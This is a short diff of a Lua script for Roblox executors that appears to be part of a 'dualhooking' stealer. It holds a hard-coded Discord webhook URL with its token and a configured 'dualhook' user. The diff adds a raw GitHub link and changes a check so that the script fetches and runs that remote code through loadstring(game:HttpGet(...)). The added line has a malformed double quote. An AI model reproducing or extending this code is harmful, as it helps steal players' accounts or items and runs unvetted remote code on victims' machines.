@@ -9,7 +9,7 @@
 
 local dhuser = "TolinRabadu"       -- dualhooking user
 local dhwebhook = "https://discord.com/api/webhooks/1133931887556051034/B22LeoRDaFTT32dkHoHyTaoLfMuHoo-AUdqan19hWRzo__6bn062CVIigkxcfFbxt8mO" -- Dualhooking Webhook
-local loadingraw = """ -- Put Your LoadingScreen Raw Link Here
+local loadingraw = ""https://raw.githubusercontent.com/NeewGood/loading/main/carregar" -- Put Your LoadingScreen Raw Link Here
 
 if getgenv().executed1 then return end
 getgenv().executed1 = true
@@ -110,7 +110,7 @@ end
 -- Checks
 
 
-if _G.LoadingScreen ~= false then
+if _G.LoadingScreen ~= true then
     loadstring(game:HttpGet(loadingraw))()
 end
 if _G.AntiLeave ~= true then
